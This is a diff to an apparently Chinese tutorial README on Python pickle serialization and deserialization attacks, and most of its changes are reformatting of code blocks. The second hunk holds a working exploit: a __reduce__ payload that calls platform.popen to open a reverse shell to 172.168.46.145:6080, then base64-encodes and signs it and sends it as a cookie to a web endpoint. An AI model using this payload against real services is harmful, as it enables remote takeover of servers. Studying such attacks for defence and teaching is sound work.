@@ -51,7 +51,41 @@ Unpickler(file).load() 实现的功能跟 pickle.load() 是一样的
 
 利用函数序列化/反序列化的代码
 ```
-import pickle#序列化数组hack_list = ["shadow", "s1riu5", "pickle"]file_seri = open("mess.txt", "wb")seri_list = pickle.dumps(hack_list)print(seri_list)result = pickle.dump(hack_list, file_seri)file_seri.close()temp = pickle.loads(seri_list)dji = open("mess.txt", "rb")temp2 = pickle.load(dji)print(temp)print(temp2)pickler_file = open("shadow", "wb")second_seri = pickle.Pickler(pickler_file).dump(hack_list)pickler_file.close()unpickler_file = open("shadow", "rb")result_unpickler = pickle.Unpickler(unpickler_file).load()print(result_unpickler)unpickler_file.close()
+import pickle
+
+#序列化数组
+hack_list = ["shadow", "s1riu5", "pickle"]
+
+file_seri = open("mess.txt", "wb")
+
+
+seri_list = pickle.dumps(hack_list)
+print(seri_list)
+
+result = pickle.dump(hack_list, file_seri)
+file_seri.close()
+
+temp = pickle.loads(seri_list)
+
+dji = open("mess.txt", "rb")
+temp2 = pickle.load(dji)
+
+print(temp)
+
+print(temp2)
+
+pickler_file = open("shadow", "wb")
+
+second_seri = pickle.Pickler(pickler_file).dump(hack_list)
+pickler_file.close()
+
+unpickler_file = open("shadow", "rb")
+
+result_unpickler = pickle.Unpickler(unpickler_file).load()
+
+print(result_unpickler)
+unpickler_file.close()
+
 ```
 
 ![](README/luffy1%204.png)
@@ -431,31 +465,28 @@ time_start=time.time()
 利用platform库可以绕过
 
 ```
-*import*pickle
-*import*base64
-*from*hashlib *import*sha256
-*import*platform
-*import*requests
+import pickle
+import base64
+from hashlib  import sha256
+import platform
+import requests
 
-*class*eval_code(object):
-
-    *def*__reduce__(self):
-        /#platform.popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")/
-
-*return*(platform.popen,(*"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.168.46.145\",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"*,))
+class eval_code(object):
+  def __reduce__(self):
+       #platform.popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")/
+    return (platform.popen,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.168.46.145\",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))
 
 
 eval_whoami = eval_code()
 location = base64.b64encode(pickle.dumps(eval_whoami))
 
-digest = sha256(*"%s%s"*% (location, *"Wtu9"*)).hexdigest()
+digest = sha256("%s%s" % (location,  "Wtu9" )).hexdigest()
 
-cookie = *"%s!%s"*% (digest, location)
+cookie = "%s!%s" % (digest, location)
 
 
-mess = requests.get(*"http://127.0.0.1:81/reminder"*, cookies=dict(location=cookie))
-*print*(mess.content)
-
+mess = requests.get("http://127.0.0.1:81/reminder", cookies=dict(location=cookie))
+print(mess.content)
 ```
 ![](README/luffy11%206.png)
 
